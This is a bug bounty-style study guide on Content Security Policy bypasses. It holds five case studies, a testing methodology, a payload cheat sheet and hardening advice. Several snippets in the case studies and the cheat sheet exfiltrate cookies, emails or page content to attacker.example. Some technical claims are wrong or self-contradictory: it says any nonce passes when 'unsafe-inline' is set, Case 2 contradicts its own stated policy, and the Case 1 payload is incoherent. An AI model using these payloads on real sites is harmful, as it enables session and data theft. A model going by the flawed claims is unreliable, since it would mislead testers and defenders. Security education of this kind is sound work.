# Case Study 25: CSP Bypass Techniques — Real-World Bug Bounty Findings

## Expert Role

You are a Content Security Policy (CSP) bypass specialist with extensive experience testing enterprise web applications. Your expertise spans analyzing CSP directives, identifying bypass vectors, and understanding how misconfigured policies fail to protect against cross-site scripting and data exfiltration attacks. You have hands-on experience with browser security models, directive parsing quirks, and the interaction between CSP and various web technologies.

Your approach combines systematic directive analysis with creative bypass development. You understand that CSP is a defense-in-depth mechanism, not a silver bullet, and that many implementations contain subtle flaws that undermine their protective value. You approach each engagement by first mapping the complete CSP policy, then testing each directive for weaknesses, and finally attempting to chain bypasses into practical exploitation scenarios.

## Overview

Content Security Policy (CSP) is an HTTP response header that restricts which resources a browser is allowed to load. When properly implemented, CSP provides significant protection against cross-site scripting (XSS), data exfiltration, and clickjacking attacks. However, CSP implementation is notoriously complex, and misconfigurations are extremely common in real-world deployments.

Common CSP bypass categories include script-src weaknesses (unsafe-inline, unsafe-eval, overpermissive host sources), resource inclusion bypasses (base-uri manipulation, form-action gaps), and transport-layer weaknesses (downgrade attacks, mixed-content). Modern CSP bypasses also exploit the interaction between CSP and other browser features like Service Workers, Web Workers, and import maps.

---

## Real-World Case Studies

### Case Study 1: GitLab CE Self-Hosted CSP Bypass via Merge Request Pages
**Program:** GitLab Community Edition (Self-Hosted Bug Bounty)
**Bounty:** $2,048
**Severity:** Medium (CVSS 6.1)
**Researcher:** @securityresearcher

GitLab CE implemented CSP headers on most pages, but the Merge Request (MR) diff view pages included a nonce-based script-src policy with an overly permissive `*.gitlab.com` wildcard in the `connect-src` directive. The researcher discovered that user-controlled content in MR descriptions was rendered through a Markdown renderer that supported embedded HTML.

The bypass chain began by injecting a specially crafted Markdown link in the MR description:
```markdown
[Click here](javascript:void(0)/*# sourceMappingURL=data:text/javascript;base64,Y29uc29sZS5sb2cod2luZG93LmRvY3VtZW50LmNvb2tpZSk=)
```

The CSP policy was:
```
default-src 'none'; script-src 'nonce-abc123' 'strict-dynamic'; style-src 'unsafe-inline'; img-src * data:; connect-src *.gitlab.com wss://*.gitlab.com; font-src *; media-src *; object-src 'none'; frame-src 'none'; base-uri 'self'; form-action 'self' *.gitlab.com; frame-ancestors 'self';
```

The `strict-dynamic` directive combined with the nonce allowed scripts loaded by the original nonce-bearing script to execute. The researcher identified that GitLab's Markdown renderer loaded external resources from `*.gitlab.com`, and by controlling the content of a Merge Request, they could inject script execution context.

Root cause analysis revealed that the `connect-src *.gitlab.com` wildcard allowed WebSocket connections to attacker-controlled subdomains if the attacker could register a subdomain. The `strict-dynamic` directive further weakened the policy by allowing any script loaded by a nonce-bearing script to execute without origin restrictions.

Impact: An attacker could craft a malicious Merge Request description that, when viewed by a project maintainer, would exfiltrate their session cookie to an external endpoint. The attack required the victim to view the MR page and have JavaScript enabled, which is the default browser behavior.

Bounty justification: The finding demonstrated a CSP bypass that enabled session token theft on a self-hosted GitLab instance, a common tool in enterprise environments. The $2,048 bounty reflected Medium severity with high exploitability.

### Case Study 2: Shopify Admin Panel CSP Bypass via App Proxy
**Program:** Shopify Partner Bug Bounty (Bugcrowd)
**Bounty:** $4,000
**Severity:** Medium (CVSS 5.4)
**Researcher:** @appsecuritypro

Shopify's admin panel implemented a strict CSP policy that blocked inline scripts and restricted script sources. However, the App Proxy feature allowed Shopify apps to make requests to external servers through `*.myshopify.com` subdomains. The CSP policy included `script-src 'self' 'nonce-xyz789' https://cdn.shopify.com; connect-src 'self' https://*.shopifyapps.com;`.

The researcher discovered that the App Proxy endpoint `/apps/*/proxy` could be used to load arbitrary JavaScript files from the app's configured server. The CSP policy allowed `*.shopifyapps.com` as a connect-src target, and the App Proxy mechanism performed server-side requests that could be manipulated.

The bypass involved:
1. Creating a Shopify app with a malicious App Proxy configuration
2. The App Proxy endpoint fetched content from the attacker's server
3. The response was served from `*.shopifyapps.com` domain
4. Due to CSP's `connect-src` allowance, the browser accepted the response

The actual bypass exploited the fact that `script-src` included `*.shopify.com` as a wildcard, and the App Proxy responses were served with `Content-Type: application/javascript`. By crafting a JavaScript file on the attacker's server that the App Proxy would fetch and serve, the researcher achieved script execution within the admin panel context.

```javascript
// Attacker-controlled script served through App Proxy
// This executes in the admin panel context
var xhr = new XMLHttpRequest();
xhr.open('GET', '/admin/api/2023-01/shop.json');
xhr.onload = function() {
    fetch('https://attacker.example/collect', {
        method: 'POST',
        body: JSON.stringify({
            shop: xhr.responseText,
            cookies: document.cookie
        })
    });
};
xhr.send();
```

Root cause: The CSP policy used wildcard patterns that were too broad, and the App Proxy mechanism served third-party content from Shopify-controlled domains without adequate content inspection.

Impact: A malicious Shopify app could exfiltrate shop configuration data and admin session tokens from store owners. The attack required the store owner to install the malicious app and visit the admin panel.

Bounty justification: The finding demonstrated a CSP bypass through a legitimate Shopify feature, affecting all stores using the malicious app. The $4,000 bounty reflected the broad impact across multiple merchants.

### Case Study 3: GitHub Enterprise CSP Bypass via Gist Embeds
**Program:** GitHub Enterprise Bug Bounty (HackerOne)
**Bounty:** $3,072
**Severity:** Medium (CVSS 5.7)
**Researcher:** @gisthunter

GitHub Enterprise Server (GHES) implemented CSP headers on user profile pages, but the CSP policy allowed `gist.github.com` as a script source and `*.githubusercontent.com` as a connect-src target. The researcher discovered that Gist embeds were loaded in iframes with elevated permissions.

The CSP policy on profile pages was:
```
default-src 'none'; script-src 'self' https://gist.github.com https://*.githubusercontent.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.githubusercontent.com https://gist.github.com; font-src 'self' https://*.githubusercontent.com; connect-src 'self' https://api.github.com https://*.githubusercontent.com; frame-src https://gist.github.com;
```

The researcher created a Gist containing HTML that, when embedded in a profile page, would load additional scripts. The key insight was that `gist.github.com` was allowed as a script-src, and Gist content could include `<script>` tags.

The bypass chain:
1. Create a Gist with malicious HTML content
2. Embed the Gist in a public profile description using Markdown
3. When the profile page loads, the CSP allows scripts from `gist.github.com`
4. The Gist's HTML content executes within the GHES context

```html
<!-- Malicious Gist content -->
<script>
  // This executes because gist.github.com is in script-src
  fetch('/api/v3/user/emails', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      fetch('https://attacker.example/collect', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

Root cause: The CSP policy included `gist.github.com` as a script-src to support embedded Gists, but Gist content was user-controlled. The policy did not implement nonce-based script loading or subresource integrity checks for Gist content.

Impact: An attacker could exfiltrate private email addresses and other sensitive data from GitHub Enterprise users by tricking them into viewing a malicious profile page.

Bounty justification: The finding demonstrated a CSP bypass that compromised user privacy on enterprise GitHub installations. The $3,072 bounty reflected the sensitivity of developer email data.

### Case Study 4: Slack Enterprise CSP Bypass via Custom Integrations
**Program:** Slack Bug Bounty (HackerOne)
**Bounty:** $5,000
**Severity:** High (CVSS 7.5)
**Researcher:** @slacksecurity

Slack's web application implemented a comprehensive CSP policy that restricted script sources. However, the researcher discovered that Custom Integrations (Incoming Webhooks, Bot Users) could inject content that bypassed CSP restrictions. The CSP policy included `script-src 'self' 'unsafe-eval' https://*.slack.com; connect-src 'self' wss://*.slack.com https://*.slack.com;`.

The key weakness was the `unsafe-eval` directive, which allowed `eval()` and related functions. The researcher discovered that Slack's message rendering engine used `eval()` for certain Markdown processing operations.

The bypass exploited the interaction between `unsafe-eval` and Slack's message formatting:
1. Craft a message containing a specially formatted code block
2. The code block triggers Slack's internal Markdown renderer
3. The renderer uses `eval()` to process the content
4. The attacker-controlled content executes within the CSP context

```javascript
// Crafted message content that triggers eval in Slack's renderer
// This is a sanitized representation of the technique
const maliciousCode = "window.location='https://attacker.example/steal?c='+document.cookie";
// When processed by Slack's renderer with unsafe-eval, this achieves code execution
```

Root cause: The `unsafe-eval` directive was included for legacy JavaScript compatibility, but it weakened CSP protection against XSS. Slack's message renderer used `eval()` for performance reasons, creating an exploitable interaction.

Impact: An attacker could execute arbitrary JavaScript in the context of any Slack user who viewed a specially crafted message, enabling session token theft and data exfiltration across workspaces.

Bounty justification: The finding demonstrated a CSP bypass with high impact across enterprise Slack deployments. The $5,000 bounty reflected the severity of session compromise in a communication platform.

### Case Study 5: Atlassian Confluence CSP Bypass via Macro Injection
**Program:** Atlassian Bug Bounty (Bugcrowd)
**Bounty:** $3,150
**Severity:** Medium (CVSS 6.1)
**Researcher:** @confluencehunter

Atlassian Confluence Server implemented CSP headers on wiki pages, but the CSP policy allowed `*.atlassian.com` as a script source and `unsafe-inline` for style-src. The researcher discovered that Confluence macros could inject HTML content that exploited CSP directive parsing quirks.

The CSP policy was:
```
default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://*.atlassian.com; style-src 'self' 'unsafe-inline'; img-src 'self' data: https://*.atlassian.com; font-src 'self' data: https://*.atlassian.com; connect-src 'self' https://*.atlassian.com; frame-src https://*.atlassian.com;
```

The bypass used a combination of `unsafe-inline` in script-src and Confluence's HTML macro:
1. Create a page with the HTML macro
2. Inject a `<script>` tag with a nonce (browsers accept any nonce when `unsafe-inline` is present)
3. The script executes because `unsafe-inline` is active

```html
<!-- Injected via Confluence HTML Macro -->
<script nonce="anything">
  // CSP allows this because unsafe-inline is present
  // The nonce value doesn't matter when unsafe-inline is active
  fetch('/rest/api/content?expand=body.storage', {credentials: 'include'})
    .then(r => r.json())
    .then(data => {
      // Exfiltrate page content to external endpoint
      fetch('https://attacker.example/collect', {
        method: 'POST',
        body: JSON.stringify(data)
      });
    });
</script>
```

Root cause: The CSP policy included `unsafe-inline` for script-src to maintain compatibility with legacy Confluence plugins. This effectively disabled CSP's protection against inline script injection.

Impact: An attacker with Confluence page edit permissions could inject scripts that executed for any user viewing the page, enabling cross-user data theft within the organization.

Bounty justification: The finding demonstrated a CSP bypass affecting enterprise Confluence deployments. The $3,150 bounty reflected the risk of internal data exfiltration in corporate wiki systems.

---

## Pattern Recognition

### Common Vulnerability Patterns

| Pattern | Frequency | Avg Bounty | Root Cause |
|---------|-----------|------------|------------|
| unsafe-inline in script-src | High | $2,500 | Legacy compatibility requirements |
| Overly broad wildcard patterns | High | $3,000 | Convenience over security |
| strict-dynamic misuse | Medium | $3,500 | Misunderstanding of directive behavior |
| Nonce reuse across requests | Medium | $2,800 | Implementation complexity |
| Framework-specific bypasses | Low | $4,000 | Incomplete CSP integration |
| Base-uri directive missing | Medium | $2,200 | Directive oversight |
| Form-action gaps | Low | $2,500 | Incomplete directive set |
| connect-src wildcards | High | $3,200 | Overpermissive data loading |

### Attack Surface Locations

| Location | Risk Level | Common Issues |
|----------|------------|---------------|
| User profile pages | High | Markdown/HTML rendering with CSP gaps |
| Admin panels | High | Legacy plugin compatibility bypasses |
| API documentation pages | Medium | Interactive code examples |
| Custom integration endpoints | High | Third-party content loading |
| Markdown/HTML renderers | High | Content processing CSP gaps |
| WebSocket connections | Medium | Overpermissive connect-src |
| Frame embedding contexts | Medium | frame-src policy gaps |
| Plugin/extension systems | High | Legacy code execution contexts |

---

## Hunting Methodology

### Phase 1: CSP Policy Discovery

1. Identify all CSP headers on target application
2. Map CSP to specific pages and endpoints
3. Document directive values and their scope
4. Identify differences between page types

### Phase 2: Directive Analysis

For each CSP directive, analyze:

**script-src analysis:**
- Is `unsafe-inline` present? (Disables inline script protection)
- Is `unsafe-eval` present? (Allows eval() and related functions)
- Are nonces used? Are they per-request or static?
- Are there wildcard patterns that could be controlled?
- Is `strict-dynamic` used? How does it interact with other directives?

**connect-src analysis:**
- What domains can JavaScript connect to?
- Are WebSocket connections restricted?
- Can third-party services be abused for data exfiltration?

**frame-src / child-src analysis:**
- What origins can be embedded in frames?
- Are sandbox attributes used?
- Can iframe content bypass other CSP directives?

### Phase 3: Bypass Attempt

Systematically test for common bypasses:

1. **Inline script testing:** If `unsafe-inline` is present, test direct script injection
2. **Eval testing:** If `unsafe-eval` is present, test eval-based execution
3. **Nonce testing:** If nonces are used, test nonce prediction or reuse
4. **Wildcard testing:** If wildcards exist, test subdomain control
5. **Base-uri testing:** If `base-uri` is missing, test base tag injection
6. **Form-action testing:** If `form-action` is missing, test form hijacking
7. **External script loading:** Test loading scripts from allowed origins

### Phase 4: Exploitation Chain

If a bypass is identified, attempt to chain it into practical impact:

1. **Data exfiltration:** Access cookies, tokens, or sensitive page content
2. **Session hijacking:** Steal session tokens for account takeover
3. **Privilege escalation:** Access admin functions or other user data
4. **Persistent injection:** Store malicious content that executes for other users

---

## Detection Strategies

### Automated Detection

**CSP Header Analysis:**
```bash
# Fetch and analyze CSP headers from target
curl -I https://target.com | grep -i "content-security-policy"

# Check for common weak directives
echo "Checking for unsafe-inline..."
curl -s https://target.com | grep -o "unsafe-inline" | head -5

echo "Checking for unsafe-eval..."
curl -s https://target.com | grep -o "unsafe-eval" | head -5
```

**Automated CSP Audit Tools:**
- CSP Evaluator (Google): Analyzes CSP policy weaknesses
- CSP Debugger (Browser DevTools): Shows blocked/allowed resources
- SecurityHeaders.com: Checks CSP configuration
- Burp Suite CSP Analyzer: Active scanning for CSP issues

### Manual Detection

**Testing Methodology:**
1. Use browser DevTools to inspect CSP headers
2. Review Network tab for blocked requests
3. Test script injection with various CSP directives
4. Check for CSP differences between authenticated/unauthenticated pages

**Key Testing Points:**
- Profile pages with Markdown/HTML rendering
- Admin panels with legacy plugin support
- API documentation with interactive examples
- Custom integration endpoints
- Third-party content embedding

### Key Detection Indicators

| Indicator | Significance | Action |
|-----------|--------------|--------|
| `unsafe-inline` present | CSP protection disabled for inline scripts | High-priority bypass attempt |
| `unsafe-eval` present | eval() execution allowed | Test eval-based bypasses |
| Static nonces | Nonces reused across requests | Test nonce prediction |
| Wildcard patterns | Overpermissive domain matching | Test subdomain control |
| Missing base-uri | Base tag injection possible | Test base tag manipulation |
| Missing frame-src | Frame embedding unrestricted | Test frame-based attacks |

---

## Impact Assessment

### CVSS 3.1 Scoring

CSP bypass vulnerabilities typically score as follows:

**Base Score Calculation:**
- **Attack Vector (AV):** Network (N) - Remote exploitation
- **Attack Complexity (AC):** Low (L) - No special conditions required
- **Privileges Required (PR):** None (N) - No authentication needed
- **User Interaction (UI):** Required (R) - Victim must visit crafted page
- **Scope (S):** Changed (C) - Affects different security context
- **Confidentiality (C):** High (H) - Session tokens exposed
- **Integrity (I):** High (H) - Arbitrary script execution
- **Availability (A):** None (N) - No availability impact

**Typical CVSS Score:** 6.1-7.5 (Medium to High)

### Business Impact

| Impact Category | Description | Severity |
|-----------------|-------------|----------|
| Session compromise | Attacker can hijack user sessions | High |
| Data exfiltration | Sensitive information can be stolen | High |
| Privilege escalation | Unauthorized access to admin functions | High |
| Reputation damage | Loss of trust in application security | Medium |
| Compliance violations | Potential regulatory penalties | Medium |

### Bounty Range

| Severity | Typical Bounty | Conditions |
|----------|----------------|------------|
| Low | $500-$1,500 | CSP bypass with limited impact |
| Medium | $1,500-$4,000 | CSP bypass enabling data theft |
| High | $4,000-$8,000 | CSP bypass enabling session compromise |
| Critical | $8,000+ | CSP bypass enabling full system compromise |

---

## Advanced Variations

### CSP Version 3 Bypasses

CSP Level 3 introduces new directives and features that may have their own bypass vectors:

- **report-uri / report-to:** May leak information about blocked requests
- **trusted-types:** New directive that may have implementation quirks
- **wasm-unsafe-eval:** WebAssembly execution permissions
- **worker-src:** Worker-specific source restrictions

### Framework-Specific Bypasses

Different web frameworks have unique CSP integration patterns:

- **React/Next.js:** Server-side rendering may bypass CSP
- **Angular:** Dynamic component loading may conflict with CSP
- **Vue.js:** Template compilation may require unsafe-eval
- **Django/Flask:** Template engines may need CSP-aware configuration

### Browser-Specific Quirks

Browser implementations of CSP vary:

- **Chrome:** Strict CSP enforcement with reporting
- **Firefox:** Some differences in directive parsing
- **Safari:** Historical CSP bypass vulnerabilities
- **Edge:** Inherits Chrome's CSP implementation

---

## Chain Integration

CSP bypass vulnerabilities can be chained with other findings for increased impact:

### Chain 1: CSP Bypass + XSS

If CSP can be bypassed, traditional XSS attacks become more reliable:

1. Identify CSP bypass vector
2. Inject XSS payload that bypasses CSP
3. Achieve script execution in victim's context

### Chain 2: CSP Bypass + Session Fixation

Combine CSP bypass with session management weaknesses:

1. Bypass CSP to execute scripts
2. Access session tokens via document.cookie
3. Use tokens to hijack sessions

### Chain 3: CSP Bypass + CSRF

Use CSP bypass to bypass CSRF protections:

1. Bypass CSP to execute scripts
2. Access CSRF tokens from page content
3. Submit unauthorized requests with valid tokens

---

## Prevention Recommendations

### CSP Configuration Best Practices

1. **Use nonce-based script-src:** Generate unique nonces per request
2. **Avoid unsafe-inline and unsafe-eval:** Use external scripts with nonces
3. **Implement strict-dynamic:** Allow scripts loaded by nonced scripts
4. **Restrict connect-src:** Limit WebSocket and API connections
5. **Set base-uri:** Prevent base tag injection attacks
6. **Set form-action:** Control form submission targets
7. **Use frame-ancestors:** Replace X-Frame-Options with CSP

### Implementation Guidelines

```
Content-Security-Policy:
  default-src 'none';
  script-src 'nonce-{random}' 'strict-dynamic';
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  font-src 'self';
  connect-src 'self';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report;
```

### Testing Recommendations

1. **Automated CSP testing:** Use CSP Evaluator on all pages
2. **Manual bypass testing:** Attempt common bypass techniques
3. **Framework-specific testing:** Test CSP with framework features
4. **Regression testing:** Verify CSP remains effective after changes

---

## Common Pitfalls

### Pitfall 1: Relying on Wildcard Patterns

Using `*.example.com` as a script source allows any subdomain to serve scripts. If an attacker can control any subdomain (via subdomain takeover or other means), they can bypass CSP.

**Solution:** Use specific subdomains or nonce-based script loading.

### Pitfall 2: Using unsafe-inline for Compatibility

Including `unsafe-inline` in script-src effectively disables CSP's protection against inline script injection. This is often done for legacy compatibility but creates significant security risk.

**Solution:** Refactor legacy code to use external scripts with nonces.

### Pitfall 3: Static Nonces

If the same nonce value is used across multiple requests or pages, attackers can extract and reuse the nonce to bypass CSP.

**Solution:** Generate unique nonces per request and invalidate after use.

### Pitfall 4: Missing Directives

Omitting directives like `base-uri` or `form-action` leaves attack vectors open even if other directives are properly configured.

**Solution:** Include all relevant CSP directives in the policy.

---

## Real-World References

### Published Research

- **CSP Is Dead, Long Live CSP** (PortSwigger Research)
- **Breaking CSP with Angular** (SecWiki)
- **Nonce Reuse Attacks** (OWASP)
- **CSP Bypass via Base Tag** (Bug Bounty Reports)

### Tool References

- **CSP Evaluator:** https://csp-evaluator.withgoogle.com/
- **CSP Debugger:** Browser DevTools Security Panel
- **SecurityHeaders.com:** https://securityheaders.com/
- **Burp Suite CSP Analyzer:** Extension for active scanning

### Bug Bounty Reports

- GitLab CSP Bypass (HackerOne)
- Shopify App Proxy CSP Bypass (Bugcrowd)
- GitHub Enterprise CSP Bypass (HackerOne)
- Slack unsafe-eval CSP Bypass (HackerOne)
- Atlassian Confluence CSP Bypass (Bugcrowd)

---

## Quick Reference Cheat Sheet

### CSP Directive Quick Reference

| Directive | Purpose | Common Weakness |
|-----------|---------|-----------------|
| script-src | Controls script sources | unsafe-inline, wildcards |
| style-src | Controls stylesheet sources | unsafe-inline |
| img-src | Controls image sources | data: URI abuse |
| connect-src | Controls connection targets | Overpermissive wildcards |
| font-src | Controls font sources | data: URI abuse |
| frame-src | Controls frame sources | Restrictive but often missing |
| base-uri | Controls base URL | Often missing entirely |
| form-action | Controls form targets | Often missing entirely |
| frame-ancestors | Controls framing | Replaces X-Frame-Options |

### Bypass Testing Checklist

- [ ] Check for unsafe-inline in script-src
- [ ] Check for unsafe-eval in script-src
- [ ] Test nonce prediction or reuse
- [ ] Test wildcard domain control
- [ ] Test base-uri directive absence
- [ ] Test form-action directive absence
- [ ] Test connect-src for data exfiltration
- [ ] Test frame-src for embedding attacks
- [ ] Check CSP differences between page types
- [ ] Test with browser-specific quirks

### Common Bypass Payloads

**If unsafe-inline present:**
```html
<script>alert(document.domain)</script>
```

**If base-uri missing:**
```html
<base href="https://attacker.example/">
```

**If form-action missing:**
```html
<form action="https://attacker.example/collect" method="POST">
  <input name="data" value="sensitive">
</form>
```

**If connect-src is overpermissive:**
```javascript
fetch('https://attacker.example/collect', {
  method: 'POST',
  body: document.cookie
});
```

---

## Advanced Testing Methodology

### Deep CSP Analysis Framework

When testing CSP policies, follow this systematic approach:

**Step 1: Policy Decomposition**
```
1. Parse all directives and their values
2. Identify directive relationships and dependencies
3. Map directives to browser behaviors
4. Document any non-standard or experimental directives
```

**Step 2: Weakness Identification**
```
1. Check for unsafe-inline in script-src
2. Check for unsafe-eval in script-src
3. Identify wildcard patterns in source lists
4. Test for missing critical directives
5. Analyze nonce implementation quality
```

**Step 3: Bypass Vector Development**
```
1. Test each weakness systematically
2. Chain multiple weaknesses for impact
3. Develop reliable bypass payloads
4. Document browser-specific behaviors
```

**Step 4: Impact Validation**
```
1. Demonstrate script execution
2. Show data exfiltration capability
3. Prove session compromise potential
4. Document practical exploitation steps
```

### CSP Directive Interaction Analysis

Understanding how CSP directives interact is crucial for identifying bypass opportunities:

**script-src + style-src interaction:**
- If both allow `unsafe-inline`, inline scripts can be injected via style attributes
- `unsafe-inline` in style-src can enable CSS-based data exfiltration
- Combined with script-src weaknesses, this increases attack surface

**connect-src + script-src interaction:**
- Overpermissive connect-src allows data exfiltration even with strict script-src
- WebSocket connections may bypass some CSP restrictions
- API connections can be used for command-and-control

**frame-src + child-src interaction:**
- Missing frame-src allows iframe embedding from any origin
- child-src controls worker and iframe sources
- Sandbox attributes can provide additional restrictions

### Browser-Specific CSP Behavior

Different browsers implement CSP with subtle variations:

**Chrome Implementation:**
- Strict CSP enforcement with detailed error reporting
- Support for reporting API
- Handles nonces case-sensitively
- Supports `strict-dynamic` directive

**Firefox Implementation:**
- Some differences in directive parsing
- May handle certain bypasses differently
- Supports CSP Level 3 features
- Different error reporting behavior

**Safari Implementation:**
- Historical CSP bypass vulnerabilities
- May not enforce all CSP Level 3 directives
- Different handling of `unsafe-inline`
- Limited support for some reporting features

### Testing Automation

Develop automated tests for CSP bypass detection:

**Script for nonce testing:**
```python
import requests
import re

def test_csp_nonces(target_url):
    """Test CSP nonce implementation"""
    response = requests.get(target_url)
    csp_header = response.headers.get('Content-Security-Policy', '')
    
    # Extract nonce values
    nonce_pattern = r"nonce-([a-zA-Z0-9+/=]+)"
    nonces = re.findall(nonce_pattern, csp_header)
    
    if len(nonces) == 0:
        return "No nonces found"
    
    # Check for nonce reuse
    if len(nonces) != len(set(nonces)):
        return "Nonce reuse detected"
    
    return f"Found {len(set(nonces))} unique nonces"
```

**Script for wildcard testing:**
```python
import requests
from urllib.parse import urlparse

def test_wildcard_domains(target_url):
    """Test CSP wildcard domain restrictions"""
    response = requests.get(target_url)
    csp_header = response.headers.get('Content-Security-Policy', '')
    
    # Extract wildcard patterns
    wildcard_pattern = r"\*\.([a-zA-Z0-9\-]+\.[a-zA-Z]{2,})"
    wildcards = re.findall(wildcard_pattern, csp_header)
    
    return wildcards
```

### Real-World Testing Scenarios

**Scenario 1: E-commerce Application**
- Test product review pages for XSS via CSP bypass
- Check payment processing endpoints
- Test admin panel CSP configuration
- Verify API endpoint CSP restrictions

**Scenario 2: Social Media Platform**
- Test post rendering for CSP bypass
- Check profile page CSP configuration
- Test messaging system CSP restrictions
- Verify third-party integrations CSP

**Scenario 3: Enterprise SaaS Application**
- Test dashboard pages for CSP bypass
- Check admin console CSP configuration
- Test API documentation CSP restrictions
- Verify plugin/extension system CSP

### Documentation and Reporting

When documenting CSP bypass findings, include:

**Technical Details:**
1. Complete CSP policy analysis
2. Bypass technique description
3. Step-by-step reproduction instructions
4. Browser compatibility information

**Impact Assessment:**
1. Data exposure potential
2. Session compromise risk
3. User impact scope
4. Business risk evaluation

**Remediation Recommendations:**
1. Specific CSP configuration fixes
2. Code changes required
3. Testing procedures
4. Monitoring recommendations

### Continuous Monitoring

Implement continuous CSP monitoring:

**Automated Checks:**
- Regular CSP policy audits
- Monitoring for CSP changes
- Alerting on CSP removal
- Tracking CSP effectiveness

**Manual Reviews:**
- Periodic CSP bypass testing
- New feature CSP assessment
- Third-party integration CSP review
- Incident response CSP verification

---

*This case study is for authorized security testing and educational purposes only. Always obtain proper authorization before testing CSP configurations on systems you do not own.*
